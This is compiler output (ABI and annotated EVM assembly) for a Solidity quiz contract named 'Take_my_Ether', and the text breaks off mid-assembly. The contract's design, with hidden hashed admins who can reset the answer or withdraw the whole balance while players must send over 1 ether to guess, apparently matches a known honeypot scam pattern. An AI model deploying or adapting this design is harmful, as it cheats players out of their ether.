{
	"contracts/Test.sol": {
		"Take_my_Ether": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "bytes32[]",
							"name": "admins",
							"type": "bytes32[]"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "nonpayable",
					"type": "fallback"
				},
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_question",
							"type": "string"
						},
						{
							"internalType": "bytes32",
							"name": "_responseHash",
							"type": "bytes32"
						}
					],
					"name": "New",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_question",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_response",
							"type": "string"
						}
					],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_response",
							"type": "string"
						}
					],
					"name": "Try",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "question",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Test.sol\":67:1310  contract Take_my_Ether... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Test.sol\":1018:1173  constructor(bytes32[] memory admins) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Test.sol\":1069:1078  uint256 i */\n  0x00\n    /* \"contracts/Test.sol\":1065:1160  for(uint256 i=0; i< admins.length; i++){... */\ntag_6:\n    /* \"contracts/Test.sol\":1085:1091  admins */\n  dup2\n    /* \"contracts/Test.sol\":1085:1098  admins.length */\n  mload\n    /* \"contracts/Test.sol\":1082:1083  i */\n  dup2\n    /* \"contracts/Test.sol\":1082:1098  i< admins.length */\n  lt\n    /* \"contracts/Test.sol\":1065:1160  for(uint256 i=0; i< admins.length; i++){... */\n  iszero\n  tag_7\n  jumpi\n    /* \"contracts/Test.sol\":1137:1141  true */\n  0x01\n    /* \"contracts/Test.sol\":1118:1123  admin */\n  0x02\n    /* \"contracts/Test.sol\":1118:1134  admin[admins[i]] */\n  0x00\n    /* \"contracts/Test.sol\":1124:1130  admins */\n  dup5\n    /* \"contracts/Test.sol\":1131:1132  i */\n  dup5\n    /* \"contracts/Test.sol\":1124:1133  admins[i] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_9\n  jumpi\n  tag_10\n  tag_11\n  jump\t// in\ntag_10:\ntag_9:\n  0x20\n  mul\n  0x20\n  add\n  add\n  mload\n    /* \"contracts/Test.sol\":1118:1134  admin[admins[i]] */\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n  0x00\n    /* \"contracts/Test.sol\":1118:1141  admin[admins[i]] = true */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Test.sol\":1100:1103  i++ */\n  dup1\n  dup1\n  tag_12\n  swap1\n  tag_13\n  jump\t// in\ntag_12:\n  swap2\n  pop\n  pop\n    /* \"contracts/Test.sol\":1065:1160  for(uint256 i=0; i< admins.length; i++){... */\n  jump(tag_6)\ntag_7:\n  pop\n    /* \"contracts/Test.sol\":1018:1173  constructor(bytes32[] memory admins) {... */\n  pop\n    /* \"contracts/Test.sol\":67:1310  contract Take_my_Ether... */\n  jump(tag_14)\n    /* \"#utility.yul\":7:82   */\ntag_15:\n    /* \"#utility.yul\":40:46   */\n  0x00\n    /* \"#utility.yul\":73:75   */\n  0x40\n    /* \"#utility.yul\":67:76   */\n  mload\n    /* \"#utility.yul\":57:76   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:82   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":88:205   */\ntag_16:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":211:328   */\ntag_17:\n    /* \"#utility.yul\":320:321   */\n  0x00\n    /* \"#utility.yul\":317:318   */\n  dup1\n    /* \"#utility.yul\":310:322   */\n  revert\n    /* \"#utility.yul\":334:451   */\ntag_18:\n    /* \"#utility.yul\":443:444   */\n  0x00\n    /* \"#utility.yul\":440:441   */\n  dup1\n    /* \"#utility.yul\":433:445   */\n  revert\n    /* \"#utility.yul\":457:559   */\ntag_19:\n    /* \"#utility.yul\":498:504   */\n  0x00\n    /* \"#utility.yul\":549:551   */\n  0x1f\n    /* \"#utility.yul\":545:552   */\n  not\n    /* \"#utility.yul\":540:542   */\n  0x1f\n    /* \"#utility.yul\":533:538   */\n  dup4\n    /* \"#utility.yul\":529:543   */\n  add\n    /* \"#utility.yul\":525:553   */\n  and\n    /* \"#utility.yul\":515:553   */\n  swap1\n  pop\n    /* \"#utility.yul\":457:559   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":565:745   */\ntag_20:\n    /* \"#utility.yul\":613:690   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":610:611   */\n  0x00\n    /* \"#utility.yul\":603:691   */\n  mstore\n    /* \"#utility.yul\":710:714   */\n  0x41\n    /* \"#utility.yul\":707:708   */\n  0x04\n    /* \"#utility.yul\":700:715   */\n  mstore\n    /* \"#utility.yul\":734:738   */\n  0x24\n    /* \"#utility.yul\":731:732   */\n  0x00\n    /* \"#utility.yul\":724:739   */\n  revert\n    /* \"#utility.yul\":751:1032   */\ntag_21:\n    /* \"#utility.yul\":834:861   */\n  tag_40\n    /* \"#utility.yul\":856:860   */\n  dup3\n    /* \"#utility.yul\":834:861   */\n  tag_19\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":826:832   */\n  dup2\n    /* \"#utility.yul\":822:862   */\n  add\n    /* \"#utility.yul\":964:970   */\n  dup2\n    /* \"#utility.yul\":952:962   */\n  dup2\n    /* \"#utility.yul\":949:971   */\n  lt\n    /* \"#utility.yul\":928:946   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":916:926   */\n  dup3\n    /* \"#utility.yul\":913:947   */\n  gt\n    /* \"#utility.yul\":910:972   */\n  or\n    /* \"#utility.yul\":907:995   */\n  iszero\n  tag_41\n  jumpi\n    /* \"#utility.yul\":975:993   */\n  tag_42\n  tag_20\n  jump\t// in\ntag_42:\n    /* \"#utility.yul\":907:995   */\ntag_41:\n    /* \"#utility.yul\":1015:1025   */\n  dup1\n    /* \"#utility.yul\":1011:1013   */\n  0x40\n    /* \"#utility.yul\":1004:1026   */\n  mstore\n    /* \"#utility.yul\":794:1032   */\n  pop\n    /* \"#utility.yul\":751:1032   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1038:1167   */\ntag_22:\n    /* \"#utility.yul\":1072:1078   */\n  0x00\n    /* \"#utility.yul\":1099:1119   */\n  tag_44\n  tag_15\n  jump\t// in\ntag_44:\n    /* \"#utility.yul\":1089:1119   */\n  swap1\n  pop\n    /* \"#utility.yul\":1128:1161   */\n  tag_45\n    /* \"#utility.yul\":1156:1160   */\n  dup3\n    /* \"#utility.yul\":1148:1154   */\n  dup3\n    /* \"#utility.yul\":1128:1161   */\n  tag_21\n  jump\t// in\ntag_45:\n    /* \"#utility.yul\":1038:1167   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1173:1484   */\ntag_23:\n    /* \"#utility.yul\":1250:1254   */\n  0x00\n    /* \"#utility.yul\":1340:1358   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":1332:1338   */\n  dup3\n    /* \"#utility.yul\":1329:1359   */\n  gt\n    /* \"#utility.yul\":1326:1382   */\n  iszero\n  tag_47\n  jumpi\n    /* \"#utility.yul\":1362:1380   */\n  tag_48\n  tag_20\n  jump\t// in\ntag_48:\n    /* \"#utility.yul\":1326:1382   */\ntag_47:\n    /* \"#utility.yul\":1412:1416   */\n  0x20\n    /* \"#utility.yul\":1404:1410   */\n  dup3\n    /* \"#utility.yul\":1400:1417   */\n  mul\n    /* \"#utility.yul\":1392:1417   */\n  swap1\n  pop\n    /* \"#utility.yul\":1472:1476   */\n  0x20\n    /* \"#utility.yul\":1466:1470   */\n  dup2\n    /* \"#utility.yul\":1462:1477   */\n  add\n    /* \"#utility.yul\":1454:1477   */\n  swap1\n  pop\n    /* \"#utility.yul\":1173:1484   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1490:1607   */\ntag_24:\n    /* \"#utility.yul\":1599:1600   */\n  0x00\n    /* \"#utility.yul\":1596:1597   */\n  dup1\n    /* \"#utility.yul\":1589:1601   */\n  revert\n    /* \"#utility.yul\":1613:1690   */\ntag_25:\n    /* \"#utility.yul\":1650:1657   */\n  0x00\n    /* \"#utility.yul\":1679:1684   */\n  dup2\n    /* \"#utility.yul\":1668:1684   */\n  swap1\n  pop\n    /* \"#utility.yul\":1613:1690   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1696:1818   */\ntag_26:\n    /* \"#utility.yul\":1769:1793   */\n  tag_52\n    /* \"#utility.yul\":1787:1792   */\n  dup2\n    /* \"#utility.yul\":1769:1793   */\n  tag_25\n  jump\t// in\ntag_52:\n    /* \"#utility.yul\":1762:1767   */\n  dup2\n    /* \"#utility.yul\":1759:1794   */\n  eq\n    /* \"#utility.yul\":1749:1812   */\n  tag_53\n  jumpi\n    /* \"#utility.yul\":1808:1809   */\n  0x00\n    /* \"#utility.yul\":1805:1806   */\n  dup1\n    /* \"#utility.yul\":1798:1810   */\n  revert\n    /* \"#utility.yul\":1749:1812   */\ntag_53:\n    /* \"#utility.yul\":1696:1818   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1824:1967   */\ntag_27:\n    /* \"#utility.yul\":1881:1886   */\n  0x00\n    /* \"#utility.yul\":1912:1918   */\n  dup2\n    /* \"#utility.yul\":1906:1919   */\n  mload\n    /* \"#utility.yul\":1897:1919   */\n  swap1\n  pop\n    /* \"#utility.yul\":1928:1961   */\n  tag_55\n    /* \"#utility.yul\":1955:1960   */\n  dup2\n    /* \"#utility.yul\":1928:1961   */\n  tag_26\n  jump\t// in\ntag_55:\n    /* \"#utility.yul\":1824:1967   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1990:2722   */\ntag_28:\n    /* \"#utility.yul\":2097:2102   */\n  0x00\n    /* \"#utility.yul\":2122:2203   */\n  tag_57\n    /* \"#utility.yul\":2138:2202   */\n  tag_58\n    /* \"#utility.yul\":2195:2201   */\n  dup5\n    /* \"#utility.yul\":2138:2202   */\n  tag_23\n  jump\t// in\ntag_58:\n    /* \"#utility.yul\":2122:2203   */\n  tag_22\n  jump\t// in\ntag_57:\n    /* \"#utility.yul\":2113:2203   */\n  swap1\n  pop\n    /* \"#utility.yul\":2223:2228   */\n  dup1\n    /* \"#utility.yul\":2252:2258   */\n  dup4\n    /* \"#utility.yul\":2245:2250   */\n  dup3\n    /* \"#utility.yul\":2238:2259   */\n  mstore\n    /* \"#utility.yul\":2286:2290   */\n  0x20\n    /* \"#utility.yul\":2279:2284   */\n  dup3\n    /* \"#utility.yul\":2275:2291   */\n  add\n    /* \"#utility.yul\":2268:2291   */\n  swap1\n  pop\n    /* \"#utility.yul\":2339:2343   */\n  0x20\n    /* \"#utility.yul\":2331:2337   */\n  dup5\n    /* \"#utility.yul\":2327:2344   */\n  mul\n    /* \"#utility.yul\":2319:2325   */\n  dup4\n    /* \"#utility.yul\":2315:2345   */\n  add\n    /* \"#utility.yul\":2368:2371   */\n  dup6\n    /* \"#utility.yul\":2360:2366   */\n  dup2\n    /* \"#utility.yul\":2357:2372   */\n  gt\n    /* \"#utility.yul\":2354:2476   */\n  iszero\n  tag_59\n  jumpi\n    /* \"#utility.yul\":2387:2466   */\n  tag_60\n  tag_24\n  jump\t// in\ntag_60:\n    /* \"#utility.yul\":2354:2476   */\ntag_59:\n    /* \"#utility.yul\":2502:2508   */\n  dup4\n    /* \"#utility.yul\":2485:2716   */\ntag_61:\n    /* \"#utility.yul\":2519:2525   */\n  dup2\n    /* \"#utility.yul\":2514:2517   */\n  dup2\n    /* \"#utility.yul\":2511:2526   */\n  lt\n    /* \"#utility.yul\":2485:2716   */\n  iszero\n  tag_63\n  jumpi\n    /* \"#utility.yul\":2594:2597   */\n  dup1\n    /* \"#utility.yul\":2623:2671   */\n  tag_64\n    /* \"#utility.yul\":2667:2670   */\n  dup9\n    /* \"#utility.yul\":2655:2665   */\n  dup3\n    /* \"#utility.yul\":2623:2671   */\n  tag_27\n  jump\t// in\ntag_64:\n    /* \"#utility.yul\":2618:2621   */\n  dup5\n    /* \"#utility.yul\":2611:2672   */\n  mstore\n    /* \"#utility.yul\":2701:2705   */\n  0x20\n    /* \"#utility.yul\":2696:2699   */\n  dup5\n    /* \"#utility.yul\":2692:2706   */\n  add\n    /* \"#utility.yul\":2685:2706   */\n  swap4\n  pop\n    /* \"#utility.yul\":2561:2716   */\n  pop\n    /* \"#utility.yul\":2545:2549   */\n  0x20\n    /* \"#utility.yul\":2540:2543   */\n  dup2\n    /* \"#utility.yul\":2536:2550   */\n  add\n    /* \"#utility.yul\":2529:2550   */\n  swap1\n  pop\n    /* \"#utility.yul\":2485:2716   */\n  jump(tag_61)\ntag_63:\n    /* \"#utility.yul\":2489:2510   */\n  pop\n    /* \"#utility.yul\":2103:2722   */\n  pop\n  pop\n    /* \"#utility.yul\":1990:2722   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2745:3130   */\ntag_29:\n    /* \"#utility.yul\":2827:2832   */\n  0x00\n    /* \"#utility.yul\":2876:2879   */\n  dup3\n    /* \"#utility.yul\":2869:2873   */\n  0x1f\n    /* \"#utility.yul\":2861:2867   */\n  dup4\n    /* \"#utility.yul\":2857:2874   */\n  add\n    /* \"#utility.yul\":2853:2880   */\n  slt\n    /* \"#utility.yul\":2843:2965   */\n  tag_66\n  jumpi\n    /* \"#utility.yul\":2884:2963   */\n  tag_67\n  tag_18\n  jump\t// in\ntag_67:\n    /* \"#utility.yul\":2843:2965   */\ntag_66:\n    /* \"#utility.yul\":2994:3000   */\n  dup2\n    /* \"#utility.yul\":2988:3001   */\n  mload\n    /* \"#utility.yul\":3019:3124   */\n  tag_68\n    /* \"#utility.yul\":3120:3123   */\n  dup5\n    /* \"#utility.yul\":3112:3118   */\n  dup3\n    /* \"#utility.yul\":3105:3109   */\n  0x20\n    /* \"#utility.yul\":3097:3103   */\n  dup7\n    /* \"#utility.yul\":3093:3110   */\n  add\n    /* \"#utility.yul\":3019:3124   */\n  tag_28\n  jump\t// in\ntag_68:\n    /* \"#utility.yul\":3010:3124   */\n  swap2\n  pop\n    /* \"#utility.yul\":2833:3130   */\n  pop\n    /* \"#utility.yul\":2745:3130   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3136:3690   */\ntag_3:\n    /* \"#utility.yul\":3231:3237   */\n  0x00\n    /* \"#utility.yul\":3280:3282   */\n  0x20\n    /* \"#utility.yul\":3268:3277   */\n  dup3\n    /* \"#utility.yul\":3259:3266   */\n  dup5\n    /* \"#utility.yul\":3255:3278   */\n  sub\n    /* \"#utility.yul\":3251:3283   */\n  slt\n    /* \"#utility.yul\":3248:3367   */\n  iszero\n  tag_70\n  jumpi\n    /* \"#utility.yul\":3286:3365   */\n  tag_71\n  tag_16\n  jump\t// in\ntag_71:\n    /* \"#utility.yul\":3248:3367   */\ntag_70:\n    /* \"#utility.yul\":3427:3428   */\n  0x00\n    /* \"#utility.yul\":3416:3425   */\n  dup3\n    /* \"#utility.yul\":3412:3429   */\n  add\n    /* \"#utility.yul\":3406:3430   */\n  mload\n    /* \"#utility.yul\":3457:3475   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":3449:3455   */\n  dup2\n    /* \"#utility.yul\":3446:3476   */\n  gt\n    /* \"#utility.yul\":3443:3560   */\n  iszero\n  tag_72\n  jumpi\n    /* \"#utility.yul\":3479:3558   */\n  tag_73\n  tag_17\n  jump\t// in\ntag_73:\n    /* \"#utility.yul\":3443:3560   */\ntag_72:\n    /* \"#utility.yul\":3584:3673   */\n  tag_74\n    /* \"#utility.yul\":3665:3672   */\n  dup5\n    /* \"#utility.yul\":3656:3662   */\n  dup3\n    /* \"#utility.yul\":3645:3654   */\n  dup6\n    /* \"#utility.yul\":3641:3663   */\n  add\n    /* \"#utility.yul\":3584:3673   */\n  tag_29\n  jump\t// in\ntag_74:\n    /* \"#utility.yul\":3574:3673   */\n  swap2\n  pop\n    /* \"#utility.yul\":3377:3683   */\n  pop\n    /* \"#utility.yul\":3136:3690   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3696:3876   */\ntag_11:\n    /* \"#utility.yul\":3744:3821   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":3741:3742   */\n  0x00\n    /* \"#utility.yul\":3734:3822   */\n  mstore\n    /* \"#utility.yul\":3841:3845   */\n  0x32\n    /* \"#utility.yul\":3838:3839   */\n  0x04\n    /* \"#utility.yul\":3831:3846   */\n  mstore\n    /* \"#utility.yul\":3865:3869   */\n  0x24\n    /* \"#utility.yul\":3862:3863   */\n  0x00\n    /* \"#utility.yul\":3855:3870   */\n  revert\n    /* \"#utility.yul\":3882:4062   */\ntag_30:\n    /* \"#utility.yul\":3930:4007   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":3927:3928   */\n  0x00\n    /* \"#utility.yul\":3920:4008   */\n  mstore\n    /* \"#utility.yul\":4027:4031   */\n  0x11\n    /* \"#utility.yul\":4024:4025   */\n  0x04\n    /* \"#utility.yul\":4017:4032   */\n  mstore\n    /* \"#utility.yul\":4051:4055   */\n  0x24\n    /* \"#utility.yul\":4048:4049   */\n  0x00\n    /* \"#utility.yul\":4041:4056   */\n  revert\n    /* \"#utility.yul\":4068:4145   */\ntag_31:\n    /* \"#utility.yul\":4105:4112   */\n  0x00\n    /* \"#utility.yul\":4134:4139   */\n  dup2\n    /* \"#utility.yul\":4123:4139   */\n  swap1\n  pop\n    /* \"#utility.yul\":4068:4145   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4151:4384   */\ntag_13:\n    /* \"#utility.yul\":4190:4193   */\n  0x00\n    /* \"#utility.yul\":4213:4237   */\n  tag_79\n    /* \"#utility.yul\":4231:4236   */\n  dup3\n    /* \"#utility.yul\":4213:4237   */\n  tag_31\n  jump\t// in\ntag_79:\n    /* \"#utility.yul\":4204:4237   */\n  swap2\n  pop\n    /* \"#utility.yul\":4259:4325   */\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":4252:4257   */\n  dup3\n    /* \"#utility.yul\":4249:4326   */\n  eq\n    /* \"#utility.yul\":4246:4349   */\n  iszero\n  tag_80\n  jumpi\n    /* \"#utility.yul\":4329:4347   */\n  tag_81\n  tag_30\n  jump\t// in\ntag_81:\n    /* \"#utility.yul\":4246:4349   */\ntag_80:\n    /* \"#utility.yul\":4376:4377   */\n  0x01\n    /* \"#utility.yul\":4369:4374   */\n  dup3\n    /* \"#utility.yul\":4365:4378   */\n  add\n    /* \"#utility.yul\":4358:4378   */\n  swap1\n  pop\n    /* \"#utility.yul\":4151:4384   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"contracts/Test.sol\":67:1310  contract Take_my_Ether... */\ntag_14:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Test.sol\":67:1310  contract Take_my_Ether... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3853682c\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3fad9ae0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xc76de3e9\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xed8df164\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_8\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_8:\n      pop\n      stop\n        /* \"contracts/Test.sol\":96:372  function Try(string memory _response) public payable... */\n    tag_3:\n      tag_11\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      tag_14\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contracts/Test.sol\":378:400  string public question */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Test.sol\":710:845  function Stop() public payable isAdmin {... */\n    tag_5:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      stop\n        /* \"contracts/Test.sol\":470:704  function Start(string calldata _question, string calldata _response) public payable isAdmin{... */\n    tag_6:\n      tag_22\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      tag_25\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contracts/Test.sol\":851:1012  function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {... */\n    tag_7:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      tag_29\n      jump\t// in\n    tag_26:\n      stop\n        /* \"contracts/Test.sol\":96:372  function Try(string memory _response) public payable... */\n    tag_14:\n        /* \"contracts/Test.sol\":185:194  tx.origin */\n      origin\n        /* \"contracts/Test.sol\":171:194  msg.sender == tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Test.sol\":171:181  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":171:194  msg.sender == tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Test.sol\":163:195  require(msg.sender == tx.origin) */\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n        /* \"contracts/Test.sol\":246:255  _response */\n      dup1\n        /* \"contracts/Test.sol\":235:256  abi.encode(_response) */\n      add(0x20, mload(0x40))\n      tag_32\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Test.sol\":225:257  keccak256(abi.encode(_response)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Test.sol\":209:221  responseHash */\n      sload(0x01)\n        /* \"contracts/Test.sol\":209:257  responseHash == keccak256(abi.encode(_response)) */\n      eq\n        /* \"contracts/Test.sol\":209:280  responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether */\n      dup1\n      iszero\n      tag_33\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":273:280  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Test.sol\":261:270  msg.value */\n      callvalue\n        /* \"contracts/Test.sol\":261:280  msg.value > 1 ether */\n      gt\n        /* \"contracts/Test.sol\":209:280  responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether */\n    tag_33:\n        /* \"contracts/Test.sol\":206:366  if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)... */\n      iszero\n      tag_34\n      jumpi\n        /* \"contracts/Test.sol\":312:322  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":304:332  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Test.sol\":304:355  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/Test.sol\":333:354  address(this).balance */\n      selfbalance\n        /* \"contracts/Test.sol\":304:355  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n        /* \"contracts/Test.sol\":206:366  if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)... */\n    tag_34:\n        /* \"contracts/Test.sol\":96:372  function Try(string memory _response) public payable... */\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":378:400  string public question */\n    tag_17:\n      0x00\n      dup1\n      sload\n      tag_37\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_39\n      swap1\n      tag_38\n      jump\t// in\n    tag_39:\n      dup1\n      iszero\n      tag_40\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_41\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_40)\n    tag_41:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_42:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_42\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/Test.sol\":710:845  function Stop() public payable isAdmin {... */\n    tag_21:\n        /* \"contracts/Test.sol\":1215:1220  admin */\n      0x02\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      0x00\n        /* \"contracts/Test.sol\":1248:1258  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":1231:1259  abi.encodePacked(msg.sender) */\n      add(0x20, mload(0x40))\n      tag_44\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Test.sol\":1221:1260  keccak256(abi.encodePacked(msg.sender)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Test.sol\":1215:1261  admin[keccak256(abi.encodePacked(msg.sender))] */\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":1207:1262  require(admin[keccak256(abi.encodePacked(msg.sender))]) */\n      tag_46\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_46:\n        /* \"contracts/Test.sol\":767:777  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":759:787  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Test.sol\":759:810  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/Test.sol\":788:809  address(this).balance */\n      selfbalance\n        /* \"contracts/Test.sol\":759:810  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n        /* \"contracts/Test.sol\":835:838  0x0 */\n      0x00\n        /* \"contracts/Test.sol\":820:838  responseHash = 0x0 */\n      dup1\n      shl\n        /* \"contracts/Test.sol\":820:832  responseHash */\n      0x01\n        /* \"contracts/Test.sol\":820:838  